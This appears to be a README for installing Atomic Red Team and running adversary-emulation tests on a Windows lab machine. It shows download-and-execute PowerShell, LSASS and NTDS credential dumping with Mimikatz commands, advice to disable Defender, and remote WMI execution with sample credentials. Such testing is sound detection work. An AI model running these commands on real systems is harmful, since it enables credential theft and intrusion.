# Installation

## Enable PowerShell script execution

```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
```

## Install Execution framework

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -InstallPath C:\AtomicRedTeam
```

## Import execution framework powershell profile

```powershell
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```

## Install atomics

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicsfolder.ps1' -UseBasicParsing);
Install-AtomicsFolder -InstallPath "C:\AtomicRedTeam" -RepoOwner "redcanaryco" -Branch "master"
```


## Test details

```powershell
Invoke-AtomicTest T1003 -ShowDetails
```

## Run test

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1
```

## Run cleanup

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup
```

# OS Credential Dumping: LSASS Memory 

T1003.001 Atomic Test #2 

```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 2
Invoke-AtomicTest T1003.001 -TestNumbers 2 -CheckPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 2 -GetPrereqs
# Disable Defender Realtime-protection otherwise procdump will hang :/
Invoke-AtomicTest T1003.001 -TestNumbers 2
# Mimikatz check
sekurlsa::minidump C:\Windows\Temp\lsass_dump.dmp
sekurlsa::logonPasswords full
```

Note:

In case you encounter error `ERROR kuhl_m_sekurlsa_acquireLSA ; Key import` you must use older build of Mimikatz or update the VM and retry the dump. Mimikatz usually tries to keep everything working only on latest systems.
https://github.com/gentilkiwi/mimikatz/issues/248

# Windows Management Instrumentation

T1047 Atomic Test #6

```powershell
Invoke-AtomicTest T1047 -TestNumbers 6 -InputArgs @{ "node" = "192.168.40.129"; "user_name" = "IEUser";  "password" = "Passw0rd!"; "process_to_execute" = """cmd /c vssadmin.exe list shadows >> c:\log.txt""" }
```

If you don't have remote machine you can test similar technique locally using Atomic Test #5

```powershell
Invoke-AtomicTest T1047 -TestNumbers 5 -InputArgs @{ "process_to_execute" = """cmd /c vssadmin.exe list shadows >> c:\log.txt""" }
```

# OS Credential Dumping: NTDS

T1003.003 Atomic Test #1 and #2

```powershell
Invoke-AtomicTest T1003.003 -TestNumbers 1,2 -CheckPrereq
Invoke-AtomicTest T1003.003 -TestNumbers 1,2
```

# Remote Access Software

T1219 Atomic Test #2

```powershell
Invoke-AtomicTest T1219 -TestNumbers 2
```